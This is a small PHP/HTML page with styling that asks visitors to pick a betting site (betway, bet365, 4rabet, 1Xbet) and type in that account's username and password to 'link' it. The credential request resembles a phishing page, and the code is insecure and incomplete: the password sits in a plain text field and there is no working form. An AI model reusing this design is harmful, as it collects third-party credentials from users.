<!DOCTYPE html>
<html>
<body>
<body style="background-color:black;">
<img src="src/logo.png" alt="Paris" style="width:50%;">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Sofia">
<?php 
$i = $_POST["username"];
echo <<< END_OF_TEXT

<label for="selector" style="color:#ffe552"><input type="radio" name="selector" value="betway" id="betway" required>betway</label><br>
<label for="selector" style="color:#ffe552"><input type="radio" name="selector" value="bet365" id="bet365" required>bet365</label><br>
<label for="selector" style="color:#ffe552"><input type="radio" name="selector" value="4raBet" id="4rabet" required>4rabet</label><br>
<label for="selector" style="color:#ffe552"><input type="radio" name="selector" value="1Xbet" id="1Xbet" required>1Xbet</label><br>
<h2>SELECT AND ENTER THE USERNAME AND PASSWORD OF YOUR BETTING HOST PROVIDER</h2>
<input type="text" name="name" placeholder="USERNAME" style="border-radius: 10px;"  >
<input type="text" name="name" placeholder="PASSWORD" style="border-radius: 10px;"  >
<input type="submit" value="LINK" onclick="myFunction()" >
END_OF_TEXT;


?>
</body>
</html> 
<style>
img {
  display: block;
  margin-left: auto;
  position: relative;
  margin-right: auto;
  max-width: 500px;
  height: 500px;
  width: auto;
  border: solid black;
}
h2 {text-align: center;
    font-family: "sans-serif";
    color: #ffe552;
    font-size: 30px;
}
label {
    text-align: center;
    color: #ffe552;
    font-size: 30px;
    margin-left:10px;

}
input[type=submit] {
  align-self: center;
  background-color: #ffe552;
  color: rgb(0, 0, 0);
  padding: 7px 20px;
  margin: 2px 0;
  border: none;
  border-radius: 14px;
  cursor: pointer;
  margin-left:auto;
  margin-right:auto;
  display:block;
  margin-top:1%;
  margin-bottom:0%;
  font-size: 25px;
  }

input[type=submit]:hover {
  background-color: #ffe552;
}
input[type=text], select {
  width: 68%;
  align-self: center;
  background-color: #ffffff;
  color: rgb(0, 0, 0);
  padding: 7px 20px;
  margin: 2px 0;
  border: none;
  border-radius: 14px;
  cursor: pointer;
  margin-left:auto;
  margin-right:auto;
  display:block;
  margin-top:1%;
  margin-bottom:0%;
}

label {
  display: block;
  color: #7d7d7d;
}

.floatBlock {
  margin: 0 1.81em 0 0;
}

.labelish {
	color:#7d7d7d;
	margin: 0;
}

.paymentOptions {
	border: none;
	display: flex;
	flex-direction: row;
	justify-content: flex-start;
	break-before: always;
	margin: 0 0 3em 0;
}

#purchaseOrder {
	margin: 0 0 2em 0;
}


</style>